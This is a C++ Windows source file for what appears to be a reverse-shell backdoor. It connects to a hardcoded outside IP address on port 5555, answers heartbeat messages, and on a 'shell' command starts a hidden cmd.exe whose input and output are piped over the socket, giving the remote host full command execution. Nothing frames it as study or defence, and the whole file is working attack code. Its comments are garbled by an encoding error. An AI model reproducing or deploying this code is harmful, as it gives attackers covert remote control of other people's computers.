#include<WINSOCK2.H>
#include<STDIO.H>
#include<iostream>
#include<cstring>
#include<windows.h>
#include<thread>
#include<process.h>
#include<tchar.h>
using namespace std;
#pragma comment(lib, "ws2_32.lib")


HANDLE hStdInRead, hStdInWrite;
HANDLE hStdOutRead, hStdOutWrite;

SECURITY_ATTRIBUTES saIn, saOut;

//SOCKET clientSocket;
SOCKET sclient;



BOOL CreateTwoPipe()
{
	DWORD dwRet;
	saIn.nLength = sizeof(SECURITY_ATTRIBUTES);
	saIn.bInheritHandle = TRUE;
	saIn.lpSecurityDescriptor = NULL;
	dwRet = CreatePipe(&hStdInRead, &hStdInWrite, &saIn, 0);	//�����ܵ�
	if (!dwRet)
	{
		printf("failed to create in pipe...\n");
		return FALSE;
	}

	saOut.nLength = sizeof(SECURITY_ATTRIBUTES);
	saOut.bInheritHandle = TRUE;
	saOut.lpSecurityDescriptor = NULL;
	dwRet = CreatePipe(&hStdOutRead, &hStdOutWrite, &saOut, 0);	//������һ���Ĺܵ�
	if (!dwRet)
	{
		printf("failed to create in pipe...\n");
		return FALSE;
	}

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hStdInRead;
	si.hStdOutput = hStdOutWrite;
	si.hStdError = hStdOutWrite;
	char cmdline[] = "cmd.exe";
	PROCESS_INFORMATION ProcessInformation;
	dwRet = CreateProcess(NULL, cmdline, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);

	return TRUE;

}

void ReadOutPutReadCmd(LPVOID lPvoid)
{
	DWORD dwByteRecv;
	char Buf[1024] = { 0 };
	int ret;

	cout << "���߳���" << endl;
	
	while (1)
	{
		memset(Buf, 0, sizeof(Buf));
		PeekNamedPipe(hStdOutRead, Buf, 1024, &dwByteRecv, 0, 0);
		if (dwByteRecv)
		{
			ret = ReadFile(hStdOutRead, Buf, dwByteRecv, &dwByteRecv, 0);
			if (!ret)
				break;
			ret = send(sclient, Buf, dwByteRecv, 0);
			cout<< ret << "���͵�����: "<< Buf << endl;
			if (ret <= 0)
				break;
		}
	}

}


int main()
{
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		return 0;
	}
	while (true)
	{
		sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sclient == INVALID_SOCKET)
		{
			printf("invalid socket!");
			return 0;
		}

		sockaddr_in serAddr;
		serAddr.sin_family = AF_INET;
		serAddr.sin_port = htons(5555);
		serAddr.sin_addr.S_un.S_addr = inet_addr("47.95.4.219");
		if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{  //����ʧ�� 
			printf("connect error !");
			closesocket(sclient);
			return 0;
		}

		//thread t(heartbeat, sclient);	//��ʼ���߳̽���������
		//t.detach();
		
		//send()������������ָ����socket�����Է�����
		//int send(int s, const void * msg, int len, unsigned int flags)
		//sΪ�ѽ��������ӵ�socket��msgָ���������ݣ�len��Ϊ���ݳ��ȣ�����flagsһ����0
		//�ɹ��򷵻�ʵ�ʴ��ͳ�ȥ���ַ�����ʧ�ܷ���-1������ԭ�����error 

		char recData[255] = {0};
		char cmd;

		while (1)	//���ض���ѭ��
		{
			int ret = recv(sclient, recData, 255, 0);
			if (ret <= 0)
			{
				cout << "�׽����Ѿ����ر���" << endl;
				break;
			}
			recData[ret] = '\0';	//����ô���ᵼ���ַ������ȴ��� Java�������ַ���û��\0
			//cout << recData << endl;

			if (!strcmp(recData, "Heart"))
			{
				cout << "������: "<<recData << endl;
			}
			else if (!strcmp(recData, "shell"))
			{
				cout << "���յ�shell����shell״̬" << endl;
				if (!CreateTwoPipe())	//�����ܵ� ���Ҵ�cmd
				{
					printf("failed to create pipe...\n");
					return 0;
				}
				DWORD dwByteRecv = 0;
				char Buf[1024] = { 0 };
				_beginthread(ReadOutPutReadCmd, 0, NULL);
				while (1)	//shellѭ��
				{
					ret = recv(sclient, Buf, 1024, 0);
					cout << "dwByteRecv:" << ret << endl << Buf << endl;
					if (ret <= 0)
					{
						cout << "�׽����Ѿ����ر���" << endl;
						break;
					}
					Buf[ret] = '\0';
					if (!strcmp(Buf, "ES"))	//�Ƚ�
					{
						cout << "�˳�shellѭ��" << endl;
						break;	//�˳�shellѭ��
					}
					if (!strcmp(Buf, "Heart"))	//�������Ļ�
					{
						cout << "������" << endl;
						//break;	//�˳�shellѭ��
						continue;
					}
					
					//cout << "1" << endl;
					Buf[ret] = '\r';
					Buf[ret + 1] = '\n';
					Buf[ret + 2] = 0;
					//cout << "2" << endl;
					printf("recv: %s", Buf);
					dwByteRecv = ret;
					ret = WriteFile(hStdInWrite, Buf, dwByteRecv + 2, &dwByteRecv, 0);
					if (!ret)
					{
						break;
					}
				}
			}

		}
		closesocket(sclient);
	}


	WSACleanup();
	return 0;

}


